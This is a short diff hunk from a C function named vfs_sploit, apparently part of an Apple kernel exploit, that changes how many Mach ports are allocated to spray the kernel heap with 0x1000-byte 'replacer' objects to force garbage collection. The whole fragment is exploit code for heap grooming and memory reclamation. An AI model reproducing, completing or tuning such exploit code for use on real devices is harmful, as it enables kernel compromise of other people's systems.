@@ -615,8 +615,8 @@ void vfs_sploit() {
     // the replacer object allocation is a 0x1000 alloc
     // using the same maths as above lets allocate 200 MB of them,
     // slowly, hoping to cause GC:
-    //int n_gc_ports = 200;
-    int n_gc_ports = 250; // 200
+    int n_gc_ports = 200;
+    // int n_gc_ports = 250; // 200
     mach_port_t gc_ports[n_gc_ports];
     for (int i = 0; i < n_gc_ports; i++) {
         gc_ports[i] = hold_kallocs(0x1000, 0x1f, 8, MACH_PORT_NULL, replacer_object);
